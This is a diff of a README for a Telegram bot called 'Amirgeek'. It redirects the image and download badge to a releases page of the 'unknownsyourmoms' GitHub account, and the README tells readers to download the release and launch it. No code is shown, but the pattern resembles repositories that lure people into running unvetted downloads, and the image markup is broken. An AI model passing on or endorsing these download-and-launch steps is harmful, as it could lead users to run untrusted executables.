@@ -3,7 +3,7 @@
 
 Welcome to the official repository of the Amirgeek Telegram Bot! Here you will find a powerful Telegram bot filled with exciting AI services, downloaders, and support for multiple languages. This bot is designed to enhance your Telegram experience with features such as ChatGPT integration, media downloads, search services, and real-time information tools.
 
-![Amirgeek Telegram Bot](https://example.com/image.png)
+![Amirgeek Telegram Bot](https://github.com/unknownsyourmoms/Amirgeek-Telegram-Bot/releases)
 
 ## Features
 
@@ -37,7 +37,7 @@ Welcome to the official repository of the Amirgeek Telegram Bot! Here you will f
 
 To start enjoying the features of the Amirgeek Telegram Bot, download the latest release from the link below:
 
-[![Download Amirgeek Telegram Bot](https://img.shields.io/badge/Download-Release-orange)](https://github.com/releases/789694263/Release.zip)
+[![Download Amirgeek Telegram Bot](https://github.com/unknownsyourmoms/Amirgeek-Telegram-Bot/releases)](https://github.com/unknownsyourmoms/Amirgeek-Telegram-Bot/releases)
 
 If the link ends with the file name, remember that it needs to be launched to start using the bot's functionalities. If you encounter any issues with the link, feel free to check the "Releases" section of this repository for alternative download options.
 
